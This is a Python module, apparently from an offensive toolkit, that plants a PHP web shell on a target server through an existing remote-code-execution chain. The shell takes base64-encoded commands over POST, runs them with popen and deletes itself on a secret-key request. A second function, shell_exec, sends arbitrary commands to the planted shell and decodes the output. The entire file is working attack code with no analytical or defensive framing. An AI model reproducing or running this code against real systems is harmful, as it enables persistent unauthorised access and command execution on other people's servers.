# Python 3.11 · webshell drop + remote exec
from __future__ import annotations

import base64
import secrets
import string

import httpx


SHELL_TEMPLATE = r"""<?php
$k = '{key}';
if (isset($_GET['k']) && $_GET['k'] === $k) {{ @unlink(__FILE__); http_response_code(410); exit; }}
if (!isset($_POST['c'])) exit;
$c = base64_decode($_POST['c']);
$p = @popen($c, 'r');
if (!$p) exit;
while (!feof($p)) {{ echo base64_encode(fread($p, 4096)); flush(); }}
pclose($p);
"""


def _rand(n: int = 8) -> str:
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(n))


def _quote(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"


async def drop_shell(client: httpx.AsyncClient, target: str) -> str:
    from ...exploit.rce import RCEChain
    key = secrets.token_hex(16)
    name = _rand() + ".php"
    path = f"/tmp/{name}"
    shell = SHELL_TEMPLATE.format(key=key)
    chain = RCEChain(client, target)
    write_cmd = f"printf %s {_quote(shell)} > {path} && chmod 644 {path}"
    ok, out = await chain.execute(write_cmd)
    if not ok:
        raise RuntimeError(f"shell write failed: {out}")
    shell_url = target.rstrip("/") + "/tmp/" + name
    r = await client.get(shell_url, timeout=10.0)
    if r.status_code >= 500:
        raise RuntimeError(f"shell unreachable: {r.status_code}")
    return shell_url + f"?k={key}"


async def shell_exec(client: httpx.AsyncClient, shell_url: str, cmd: str) -> str:
    r = await client.post(shell_url, data={"c": base64.b64encode(cmd.encode()).decode()}, timeout=30.0)
    try:
        return base64.b64decode(r.text).decode("utf-8", "replace")
    except Exception:
        return r.text